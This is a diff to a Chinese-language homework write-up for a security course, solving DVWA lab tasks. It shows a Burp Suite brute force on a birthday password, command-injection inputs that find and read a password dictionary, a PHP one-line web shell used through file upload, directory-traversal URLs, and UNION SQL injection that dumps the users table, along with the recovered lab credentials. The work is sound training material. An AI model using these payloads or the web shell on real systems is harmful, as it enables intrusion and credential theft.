@@ -118,8 +118,167 @@
 > 管理员账号 / 密码：******   
 > 注意事项：爆破成功的同学请勿修改任何账号的密码，以免影响其他同学正常作业。   
 
-## 1. 老李今年 52 岁了，他最近也在学习网络安全，为了方便练习，他在 DVWA 靶场中增设了一个自己的账号，密码就是他的生日，请你想办法破解出他的账号密码。
-## 2. Cookie 老师在 DVWA 靶场中设置了一个账号 Geektime（注意首字母大写），且在靶场中的某处存放了一个文件名为 geekbang.txt 的密码字典，请你想办法找到该字典并尝试爆破，最终获取到账号 Geektime 的正确密码。
+## 1. 准备工作
+对目标站点进行分析，查看拥有那些可以利用的漏洞，来完成以下两个任务。因为此站点本身就是靶场站点，所以通过不同的菜单名字就可以简单分析出相关漏洞，下面列表为自认为对下列任务有帮助的漏洞。
+|漏洞名称|漏洞位置|可用性分析|
+|---|---|---|---|
+|登录爆破|/vulnerabilities/brute/|可以用来执行任务1和任务2中爆破任务|
+|命令注入|/vulnerabilities/exec/|可以远程命令执行，通过指令查找任务2中 geekbang.txt 文件|
+|文件上传|/vulnerabilities/upload/|尝试上传一句话脚本文件，实现RCE，寻找任务2中的密码字典|
+|SQL注入|/vulnerabilities/sqli/|利用SQL注入实现脱库，直接盗取任务1 和 任务2中的账号密码信息|
+## 2. 任务
+### 2.1 老李今年 52 岁了，他最近也在学习网络安全，为了方便练习，他在 DVWA 靶场中增设了一个自己的账号，密码就是他的生日，请你想办法破解出他的账号密码。
+### 2.2 Cookie 老师在 DVWA 靶场中设置了一个账号 Geektime（注意首字母大写），且在靶场中的某处存放了一个文件名为 geekbang.txt 的密码字典，请你想办法找到该字典并尝试爆破，最终获取到账号 Geektime 的正确密码。
+## 3. 实战
+### 3.1 分析任务1中的关键信息，利用关键信息进行密码爆破
+|关键信息|分析与描述|
+|---|---|
+|姓名|姓名为老李，那么他的登录账号很有肯能就是 `laoli`|
+|生日|密码为他的生日，他今年52岁了，如果是虚岁那么就是1972年的，如果是周岁就是1971年的,那么尝试使用|
+#### 结论
+使用账号为`laoli` 密码为以1972 或者 1971 开头后面拼接月份和日期进行爆破，爆破模式为“集束炸弹”模式。
+
+> burp suite 中的四种攻击模式：   
+> 狙击手模式：使用一个字典，主要讲标记的数据进行逐个遍历替换。   
+> 攻城锤模式：使用一个字典，将包内所有标记的数据进行同时替换再发出。   
+> 干草叉模式：对每个标记字段单独设置字典，按照一一对应的关系取最少的组合。   
+> 集束炸弹模式：使用穷举的方法，对每个标记字段都遍历字典。   
+
+### 3.2 爆破
+#### 3.2.1 爆破参数设置
+##### 参数设计
+分别设计了三个可变参数：年、月、日
+![Alt text](image-46.png)   
+
+年
+![Alt text](image-43.png)  
+
+月
+![Alt text](image-45.png)   
+
+日
+![Alt text](image-44.png)
+
+##### 爆破成功
+![Alt text](image-47.png)
+#### 结果
+账号为：`laoli`，密码为：`19710728`   
+
+### 3.3 基于命令注入，寻找任务2中`Geektime`的密码字典。
+#### 3.3.1 尝试命令注入，输入以下内容
+```shell
+192.168.0.1 | pwd
+```
+运行结果如下：   
+![Alt text](image-48.png)
+
+#### 3.3.2 使用`find`指令查找任务2中所提到的 `geekbang.txt` 文件。
+```shell
+192.168.0.1 | find / -name 'geekbang.txt'
+```
+运行结果如下：
+![Alt text](image-49.png)   
+
+#### 3.3.3 使用`cat`指令查看`/var/www/html/geekbang.txt`中的内容。
+```shell
+192.168.0.1 | cat /var/www/html/geekbang.txt
+```
+运行结果如下：
+![Alt text](image-50.png)
+#### 3.3.4 使用 BurpSuite 中爆破工具的狙击手模式，进行爆破。
+##### 参数设计
+![Alt text](image-51.png)
+
+字典设置   
+![Alt text](image-52.png)
+
+##### 爆破成功
+![Alt text](image-53.png)
+
+#### 结果
+账号为：`Geektime` 密码为：`geektime666`
+
+### 3.4 基于文件上传漏洞，获取获取任务2中的`geekbang.txt`文件，只要能够找到，并且输入内容，后面的爆破过程不在重复演示。
+#### 3.4.1 上传一句话木马文件
+```php
+<?php @system($_GET['hacker']); ?>
+```
+
+#### 3.4.1 寻找`geekbang.txt`文件
+```url
+http://121.***.**.**:8082/hackable/uploads/2.php?hacker=find%20/%20-name%20%27geekbang.txt%27
+```
+![Alt text](image-61.png)
+
+#### 3.4.2 访问该文件
+![Alt text](image-62.png)
+
+#### 成功过去密码字典。
+
+### 3.5 在文件上传成功后，发现改网站存在“目录穿越”漏洞，那么可以尝试穷举获取`geekbang.txt`文件。
+![Alt text](image-65.png)
+```url
+http://121.***.**.**:8082/vulnerabilities/upload/../geekbang.txt
+```
+![Alt text](image-63.png)   
+
+继续尝试上层目录
+```url
+http://121.***.**.**:8082/vulnerabilities/upload/../../geekbang.txt
+```
+#### 成功获取密码字典内容
+![Alt text](image-64.png)
+
+### 3.6 利用SQL注入进行完成任务1和任务2
+#### 3.6.1 已知SQL页面，利用SQL注入漏洞，先尝试对齐字段数量
+```mysql
+1' union all select 1,2 #
+```
+![Alt text](image-66.png)
+
+#### 3.6.2 查看数据库信息
+```mysql
+1' union all select 1,databases() #
+```
+![Alt text](image-67.png)
+
+#### 3.6.3 查看数据库中表信息
+```mysql
+1' union all select table_name,database() from INFORMATION_SCHEMA.tables where table_schema=database() #
+```
+![Alt text](image-68.png)   
+
+##### 结果解释
+可以看到，存在两张表，分别是 `guestbook` 和 `users`。
+
+#### 3.6.4 锁定 `users`，查看表中的字段信息
+```mysql
+1' union all select table_name,column_name from INFORMATION_SCHEMA.columns where table_name='users' #
+```
+![Alt text](image-69.png)   
+
+##### 结果说明
+从各结果中的`Surname`字段值，可以看到对应的字段值，猜想应该可能是 `user` 和 `password` 两个字段。
+
+#### 3.6.5 查询 `user` 和 `password` 两个字段的值。
+
+```mysql
+1' union all select user,password from users #
+```
+![Alt text](image-70.png)   
+
+#### 3.6.6 尝试破解任务1和任务2目标密码
+```url
+https://www.cmd5.org/
+```
+##### `laoli`的密码，破解成功
+![Alt text](image-71.png)   
+
+##### `Geektime`的密码，破解失败
+![Alt text](image-72.png)
+
+
+
 
 # 五、在不依赖于 DVWA 后端数据库的情况，如何通过前端验证的方法判断 DVWA 中的注入点是数字型注入还是字符型注入？（提示：用假设法进行逻辑判断）
 
